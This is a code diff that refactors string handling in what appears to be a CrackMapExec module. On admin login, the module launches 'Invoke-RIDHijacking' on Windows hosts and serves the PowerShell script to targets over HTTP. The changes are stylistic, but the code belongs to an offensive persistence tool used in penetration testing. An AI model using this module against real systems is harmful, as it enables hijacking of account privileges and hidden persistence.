@@ -30,7 +30,7 @@ class CMEModule:
         self.password = None
         self.useguest = False
         self.enable = False
-        
+
         if 'RID' in module_options:
             self.rid = int(module_options['RID'])
         if 'USER' in module_options:
@@ -46,11 +46,11 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         command = 'Invoke-RIDHijacking'
-        command += ' -RID ' + str(self.rid)
+        command += f' -RID {str(self.rid)}'
         if self.user:
-            command += ' -User ' + self.user
+            command += f' -User {self.user}'
         if self.password:
-            command += ' -Password ' + self.password
+            command += f' -Password {self.password}'
         if self.useguest:
             command += ' -UseGuest '
         if self.enable:
@@ -61,7 +61,7 @@ class CMEModule:
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
-        if 'Invoke-RIDHijacking.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-RIDHijacking.ps1':
             request.send_response(200)
             request.end_headers()
 
